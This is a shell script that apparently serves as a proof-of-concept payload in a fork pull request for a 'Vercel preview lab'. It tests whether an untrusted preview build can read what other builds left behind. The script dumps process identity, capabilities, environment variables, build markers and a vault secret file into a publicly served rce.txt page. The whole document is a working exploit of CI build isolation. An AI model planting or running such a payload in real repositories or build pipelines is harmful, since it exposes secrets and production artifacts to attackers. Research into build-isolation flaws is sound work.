#!/bin/sh
# Payload introduced ONLY by the fork PR. It names no artifact hash and makes
# no API call: it only reads what the platform and the build tool left on disk.
# turbo runs this with cwd = packages/probe, so the deploy output dir is ../../public
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
{
  echo "== fork-PR preview build =="
  id
  grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status
  echo "VERCEL_ENV=${VERCEL_ENV:-unset}"
  echo "VERCEL_GIT_PULL_REQUEST_ID=${VERCEL_GIT_PULL_REQUEST_ID:-unset}"
  echo "LAB_PROD_ONLY in this build env: ${LAB_PROD_ONLY:-unset}"
  echo "TURBO_CACHE=${TURBO_CACHE:-unset} TURBO_REMOTE_ONLY=${TURBO_REMOTE_ONLY:-unset}"
  echo
  echo "== files NOT in git that exist in this build =="
  git ls-files packages/vault | sed 's/^/  tracked: /'
  ls -la ../vault/out ../../build-notes 2>&1 | sed 's/^/  /'
  echo
  echo "== markers written by OTHER builds =="
  echo -n "  build-notes/marker-production.txt -> "
  cat ../../build-notes/marker-production.txt 2>&1
  echo -n "  build-notes/marker-preview.txt -> "
  cat ../../build-notes/marker-preview.txt 2>&1
  echo -n "  public/marker-production.txt -> "
  cat "$OUT/marker-production.txt" 2>&1
  echo -n "  packages/vault/out/secret.txt -> "
  cat ../vault/out/secret.txt 2>&1
} > "$OUT/rce.txt"
sleep 2
cat "$OUT/rce.txt"
